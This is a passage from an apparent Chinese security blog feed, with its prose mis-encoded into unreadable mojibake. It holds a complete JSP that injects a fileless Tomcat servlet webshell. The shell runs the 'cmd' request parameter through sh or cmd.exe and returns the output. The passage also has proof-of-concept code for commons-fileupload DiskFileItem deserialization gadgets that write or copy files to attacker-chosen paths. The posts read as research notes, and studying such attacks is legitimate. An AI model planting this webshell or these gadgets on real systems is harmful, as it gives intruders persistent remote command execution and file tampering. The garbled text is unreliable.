alt="QQæˆªå›¾20220413215452"></p><p>åœ¨è¿™é‡Œæ·»åŠ æ˜ å°„å…³ç³»ï¼Œ å°† url è·¯å¾„å’Œ servlet ç±»åšæ˜ å°„ã€‚</p><h2 id="Servletå†…å­˜é©¬"><a href="#Servletå†…å­˜é©¬" class="headerlink" title="Servletå†…å­˜é©¬"></a>Servletå†…å­˜é©¬</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br><br>&lt;%<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;servletshell&quot;</span>;<br>    <span class="hljs-comment">// è·å–ä¸Šä¸‹æ–‡</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br>    <span class="hljs-comment">//æ³¨å†ŒServletå¯¹è±¡ å¹¶é‡å†™serviceæ–¹æ³•</span><br>    <span class="hljs-type">Servlet</span> <span class="hljs-variable">servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Servlet</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>            <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                isLinux = <span class="hljs-literal">false</span>;<br>            &#125;<br>            String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();<br>            <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>( in ).useDelimiter(<span class="hljs-string">&quot;\\a&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>            out.println(output);<br>            out.flush();<br>            out.close();<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">//åˆ›å»ºWrapperå¯¹è±¡æ¥å°è£…å‰é¢new Servletå¯¹è±¡</span><br>    org.apache.catalina.<span class="hljs-type">Wrapper</span> <span class="hljs-variable">newWrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    newWrapper.setName(name);<br>    newWrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<br>    newWrapper.setServlet(servlet);<br>    newWrapper.setServletClass(servlet.getClass().getName());<br>    <span class="hljs-comment">//æ·»åŠ è·¯ç”± ä¸ºWrapperå¯¹è±¡æ·»åŠ  mapæ˜ å°„</span><br>    standardContext.addChild(newWrapper);<br>    standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/servletmashell&quot;</span>,name);<br>    out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br><br>%&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å†…å­˜é©¬</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FileUpload2</title>
    <link href="/2022/04/13/FileUpload2/"/>
    <url>/2022/04/13/FileUpload2/</url>
    
    <content type="html"><![CDATA[<h1 id="FileUpload2"><a href="#FileUpload2" class="headerlink" title="FileUpload2"></a>FileUpload2</h1><p>å®ç°ä»»æ„æ–‡ä»¶çš„ç§»åŠ¨ã€‚æ§åˆ¶cachedContentä¸ºç©ºã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204131501778.png" alt="QQæˆªå›¾20220413145953"></p><h2 id="å®ç°ä»£ç "><a href="#å®ç°ä»£ç " class="headerlink" title="å®ç°ä»£ç "></a>å®ç°ä»£ç </h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">written</span> <span class="hljs-operator">=</span> ThresholdingOutputStream.class.getDeclaredField(<span class="hljs-string">&quot;written&quot;</span>);<br>     written.setAccessible(<span class="hljs-literal">true</span>);<br>     written.set(dfos,<span class="hljs-number">100</span>);<br></code></pre></td></tr></table></figure><p>ç›´æ¥ä¸Špocäº†ã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.fileupload.disk.DiskFileItem;<br><span class="hljs-keyword">import</span> org.apache.commons.io.output.DeferredFileOutputStream;<br><span class="hljs-keyword">import</span> org.apache.commons.io.output.ThresholdingOutputStream;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileUpload2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">repository</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;F:\\FileUpload1\\123.txt\\1.tmp&quot;</span>);<br>        <span class="hljs-type">File</span> <span class="hljs-variable">repository1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;F:\\FileUpload1\\456.txt&quot;</span>);<br><br>        <span class="hljs-type">DeferredFileOutputStream</span> <span class="hljs-variable">dfos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeferredFileOutputStream</span>(<span class="hljs-number">1</span>, repository);<br><br>        <span class="hljs-type">DiskFileItem</span> <span class="hljs-variable">diskFileItem</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DiskFileItem</span>(<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>,<span class="hljs-number">1</span>,repository1);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">written</span> <span class="hljs-operator">=</span> ThresholdingOutputStream.class.getDeclaredField(<span class="hljs-string">&quot;written&quot;</span>);<br>        written.setAccessible(<span class="hljs-literal">true</span>);<br>        written.set(dfos,<span class="hljs-number">100</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">dfosFile1</span> <span class="hljs-operator">=</span> DiskFileItem.class.getDeclaredField(<span class="hljs-string">&quot;dfos&quot;</span>);<br>        dfosFile1.setAccessible(<span class="hljs-literal">true</span>);<br>        dfosFile1.set(diskFileItem, dfos);<br>        <br>        serialize(diskFileItem);<br>        FileUpload1.unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå®ç°äº†å°†1.tmpçš„å†…å®¹copyåˆ°456å½“ä¸­ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204131501677.png" alt="QQæˆªå›¾20220413145859"></p>]]></content>
    
    
    <categories>
      
      <category>FileUpload</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FileUpload1</title>
    <link href="/2022/04/13/FileUpload1/"/>
    <url>/2022/04/13/FileUpload1/</url>
    
    <content type="html"><![CDATA[<h1 id="FileUpload1"><a href="#FileUpload1" class="headerlink" title="FileUpload1"></a>FileUpload1</h1><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-fileupload<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-fileupload<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">DiskFileItem.readObject()<br>    DiskFileItem.getOutputStream()<br>            DeferredFileOutputStream.write()<br></code></pre></td></tr></table></figure><h2 id="DiskFileItem-readObject"><a href="#DiskFileItem-readObject" class="headerlink" title="DiskFileItem#readObject"></a>DiskFileItem#readObject</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204130000971.png" alt="QQæˆªå›¾20220412225050"></p><h3 id="this-getOutputStream"><a href="#this-getOutputStream" class="headerlink" title="this.getOutputStream"></a>this.getOutputStream</h3><p>è·Ÿè¿›çœ‹ä¸€ä¸‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122341990.png" alt="QQæˆªå›¾20220412225416"></p><p>dfosæ˜¯ä¸€ä¸ªå®ƒçš„å¯¹è±¡ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204130000114.png" alt="QQæˆªå›¾20220412225805"></p><p>å¦‚æœdfosä¸ºç©ºã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204130000551.png" alt="QQæˆªå›¾20220412230051"><br>é‚£ä¹ˆæ–‡ä»¶è·¯å¾„ä½¿ç”¨ tempFileï¼Œå¦‚æœtempFileä¸ºç©ºå°±ä½¿ç”¨repositoryä»£æ›¿tempFileï¼ˆè¿™é‡Œå°±å¯ä»¥æŒ‡å®šæ–‡ä»¶è·¯å¾„å†™å…¥ï¼ï¼‰ã€‚å¦‚æœè¿˜ä¸ºç©ºï¼Œåˆ™ä½¿ç”¨ <code>System.getProperty(&quot;java.io.tmpdir&quot;)</code>ï¼Œæ–‡ä»¶åä½¿ç”¨ <code>format(&quot;upload_%s_%s.tmp&quot;, UID, getUniqueId())</code> ç”Ÿæˆéšæœºçš„æ–‡ä»¶åã€‚</p><p>æ¥ç€å°±æ˜¯åˆ¤æ–­ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.cachedContent != <span class="hljs-literal">null</span>) &#123;<br>            output.write(<span class="hljs-built_in">this</span>.cachedContent);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-built_in">this</span>.dfosFile);<br>            IOUtils.copy(input, output);<br>            <span class="hljs-built_in">this</span>.dfosFile.delete();<br>            <span class="hljs-built_in">this</span>.dfosFile = <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        output.close();<br>        <span class="hljs-built_in">this</span>.cachedContent = <span class="hljs-literal">null</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœcachedContentä¸ä¸ºç©ºï¼Œåˆ™ç›´æ¥å†™å…¥ã€‚</p><h2 id="DiskFileItem-writeObject"><a href="#DiskFileItem-writeObject" class="headerlink" title="DiskFileItem#writeObject"></a>DiskFileItem#writeObject</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122341882.png" alt="QQæˆªå›¾20220412233859"></p><p>è¿™é‡Œåˆ¤æ–­å°±æ˜¯é€šè¿‡ <code>dfos.isInMemory()</code> æ–¹æ³•åˆ¤æ–­æ–‡ä»¶å†…å®¹æ˜¯å¦æ˜¯åœ¨å†…å­˜ä¸­ï¼Œå…¶å®ä¹Ÿå°±æ˜¯é€šè¿‡åˆ¤æ–­ written çš„é•¿åº¦å’Œ threshold é˜ˆå€¼é•¿åº¦å¤§å°ï¼Œå¦‚æœå†™å…¥å¤§äºé˜ˆå€¼ï¼Œåˆ™ä¼šè¢«å†™å‡ºåˆ°æ–‡ä»¶ä¸­ï¼Œé‚£å°±ä¸æ˜¯å­˜åœ¨å†…å­˜ä¸­äº†ã€‚</p><ul><li>å¦‚æœåœ¨å†…å­˜ä¸­ï¼Œåˆ™ä¼šè°ƒç”¨ <code>dfos.getData()</code> æ–¹æ³•è·å–å­˜åœ¨ dfos æˆå‘˜å˜é‡ memoryOutputStream çš„ ByteArrayOutputStream å¯¹è±¡æ”¾åœ¨ cachedContent ä¸­ã€‚</li><li>å¦‚æœä¸åœ¨å†…å­˜ä¸­ï¼Œåˆ™ä¼šå°† cachedContent ç½®ä¸ºç©ºï¼Œç„¶åå°† dfosFile èµ‹å€¼ä¸º dfos çš„æˆå‘˜å˜é‡ outputFile å¯¹è±¡ã€‚</li></ul><p>ç”±äº dfos æ˜¯ transient ä¿®é¥°çš„ï¼Œä¸èƒ½è¢«ååºåˆ—åŒ–ï¼Œæ‰€ä»¥èƒ½è¢«ååºåˆ—åŒ–çš„æœ‰ byte æ•°ç»„ç±»å‹çš„ cachedContent å’Œ File å¯¹è±¡çš„ dfosFileã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.fileupload.disk.DiskFileItem;<br><span class="hljs-keyword">import</span> org.apache.commons.io.output.DeferredFileOutputStream;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileUpload1</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        <br>        <span class="hljs-type">String</span> <span class="hljs-variable">charset</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;UTF-8&quot;</span>;<br>        <span class="hljs-type">byte</span>[] bytes   = <span class="hljs-string">&quot;xsw6a&quot;</span>.getBytes(charset);<br>        <br><span class="hljs-type">File</span>   <span class="hljs-variable">repository</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;F:\\FileUpload1&quot;</span>);<br>        <br>        <span class="hljs-type">DeferredFileOutputStream</span> <span class="hljs-variable">dfos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeferredFileOutputStream</span>(<span class="hljs-number">0</span>, repository);<br>        <br>        <span class="hljs-type">DiskFileItem</span> <span class="hljs-variable">diskFileItem</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DiskFileItem</span>(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>, repository);<br><br><span class="hljs-comment">//         åºåˆ—åŒ–æ—¶ writeObject è¦æ±‚ dfos ä¸èƒ½ä¸º null</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">dfosFile</span> <span class="hljs-operator">=</span> DiskFileItem.class.getDeclaredField(<span class="hljs-string">&quot;dfos&quot;</span>);<br>        dfosFile.setAccessible(<span class="hljs-literal">true</span>);<br>        dfosFile.set(diskFileItem, dfos);<br>        <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field2</span> <span class="hljs-operator">=</span> DiskFileItem.class.getDeclaredField(<span class="hljs-string">&quot;cachedContent&quot;</span>);<br>        field2.setAccessible(<span class="hljs-literal">true</span>);<br>        field2.set(diskFileItem, bytes);<br><br>        serialize(diskFileItem);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="ç»†èŠ‚"><a href="#ç»†èŠ‚" class="headerlink" title="ç»†èŠ‚"></a>ç»†èŠ‚</h2><p> åºåˆ—åŒ–æ—¶ writeObject è¦æ±‚ dfos ä¸èƒ½ä¸º nullï¼Ÿä¸ºä»€ä¹ˆï¼Ÿéš¾é“ä¸èƒ½é€šè¿‡åå°„ç›´æ¥è®¾ç½®outputFileçš„å€¼ä¸ºdfoså—ï¼Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122352647.png" alt="QQæˆªå›¾20220412235227"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204130000292.png" alt="QQæˆªå›¾20220412235233"></p><p>å¯ä»¥æ˜¯å¯ä»¥ï¼Œä½†æ˜¯ä¸èƒ½åºåˆ—åŒ–<strong>ã€‚å› ä¸ºæ²¡æœ‰ç»§æ‰¿Serializableï¼ï¼</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204130000266.png" alt="QQæˆªå›¾20220412235700"></p><h2 id="æ•ˆæœ"><a href="#æ•ˆæœ" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204130000900.png" alt="QQæˆªå›¾20220412235918"></p>]]></content>
    
    
    <categories>
      
      <category>FileUpload</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å†…å­˜é©¬ï¼šFilterå‹--ç¬¬äºŒå¤©</title>
    <link href="/2022/04/12/%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9AFilter%E5%9E%8B-%E7%AC%AC%E4%BA%8C%E5%A4%A9/"/>
